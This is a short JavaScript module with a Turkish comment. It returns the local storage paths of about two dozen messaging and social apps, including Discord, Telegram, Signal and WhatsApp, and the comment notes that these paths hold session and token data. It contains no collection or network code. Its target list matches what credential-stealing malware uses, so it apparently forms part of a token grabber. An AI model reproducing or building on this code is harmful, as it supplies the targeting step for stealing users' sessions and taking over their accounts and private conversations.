const os = require('os');
const path = require('path');

/**
 * Sistemdeki sosyal medya ve mesajlaşma uygulamalarının veri yollarını döndürür.
 * Bu yollar genellikle oturum (session) ve token verilerini içerir.
 */
const GetSocialPaths = () => {
    const home = os.homedir();
    const appData = process.env.APPDATA || path.join(home, 'AppData', 'Roaming');
    const localAppData = process.env.LOCALAPPDATA || path.join(home, 'AppData', 'Local');

    return {
        "Discord": path.join(appData, "discord", "Local Storage", "leveldb"),
        "Discord Canary": path.join(appData, "discordcanary", "Local Storage", "leveldb"),
        "Discord PTB": path.join(appData, "discordptb", "Local Storage", "leveldb"),
        "Telegram Desktop": path.join(appData, "Telegram Desktop", "tdata"),
        "WhatsApp Desktop": path.join(appData, "Packages", "5319275A.WhatsAppDesktop_cv1g1gvanyjgm", "LocalState"),
        "Signal Desktop": path.join(appData, "Signal", "databases"),
        "Skype": path.join(appData, "Microsoft", "Skype for Desktop", "Local Storage"),
        "Facebook Messenger": path.join(localAppData, "Facebook", "Messenger"),
        "Microsoft Teams": path.join(localAppData, "Microsoft Teams"),
        "Snapchat": path.join(localAppData, "Snapchat"),
        "Instagram": path.join(localAppData, "Instagram"),
        "Viber": path.join(localAppData, "Viber"),
        "Line": path.join(localAppData, "Line"),
        "WeChat": path.join(localAppData, "WeChat"),
        "Reddit": path.join(localAppData, "Reddit"),
        "Pinterest": path.join(localAppData, "Pinterest"),
        "Trello": path.join(localAppData, "Trello"),
        "Purple": path.join(appData, ".purple"),
        "Tox": path.join(appData, "tox"),
        "Element": path.join(appData, "Element", "Local Storage"),
        "Tumblr": path.join(localAppData, "Tumblr"),
        "ICQ": path.join(localAppData, "ICQ", "0001"),
        "Flock": path.join(localAppData, "Flock"),
        "Hangouts": path.join(localAppData, "Google", "Hangouts")
    };
};

module.exports = { GetSocialPaths };